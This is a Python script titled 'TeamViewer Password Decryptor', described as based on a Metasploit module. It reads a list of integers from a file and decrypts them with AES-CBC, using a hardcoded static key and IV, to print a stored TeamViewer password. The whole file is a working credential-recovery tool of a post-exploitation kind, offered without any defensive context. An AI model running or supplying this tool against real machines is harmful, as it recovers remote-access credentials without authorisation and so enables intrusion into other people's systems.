#/usr/bin/python3

from Crypto.Cipher import AES
from colorama import Fore, Style
import argparse
import sys


def parse_arguments():
    parser = argparse.ArgumentParser(description=f"{Fore.RED}TeamViewer Password Decryptor.{Fore.RESET}")
    
    # Define flags
    parser.add_argument('-l', '--list', type=str, help='Filename containing the integers to decrypt. Example: list.txt', required=True)

    # Parse the command line arguments
    args = parser.parse_args()

    # Return the parsed arguments
    return args


def read_file(args: argparse.Namespace) -> list[int] | None:
    """
    Read file and convert its lines into a lister of integers
    """
    try:
        with open(args.list, 'r') as f:
            lines = f.readlines()
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Error. Could not find file {args.list!r}.{Fore.RESET}")
        sys.exit(1)
    # Check that all the lines are integer numbers
    for n_line in range(0, len(lines)):
        try:
            lines[n_line] = int(lines[n_line])
        except ValueError:
            print(f"{Fore.RED}[!] Error. Could not convert item in line {n_line+1} ({lines[n_line].strip()!r}) since it is not an integer number. The list only must containt integer numbers")
            sys.exit(1)
    return lines


def decrypt_password(list_password: list[int])->None:
    """
    Algoroithm based on Metasploit 'Teamviever Passwords'
    """
    key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
    iv = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
    ciphertext = bytes(list_password)
    aes = AES.new(key, AES.MODE_CBC, IV=iv)
    password = aes.decrypt(ciphertext).decode("utf-16").rstrip("\x00")
    print(f"\n{Fore.GREEN}[+] {Fore.BLUE}Decrypted Password:    {Style.BRIGHT}{Fore.CYAN}{password}{Fore.RESET}{Style.RESET_ALL}")
    print(f"\nBye{Fore.RED}!{Fore.RESET}")
    return


def main()->None:
    # Get arguments from the user
    args = parse_arguments()
    # Read the file containing numbers that will be decrypted into the password
    list_password_numbers = read_file(args)
    # And decrypt the password
    decrypt_password(list_password_numbers)


if __name__ == "__main__":
    main()
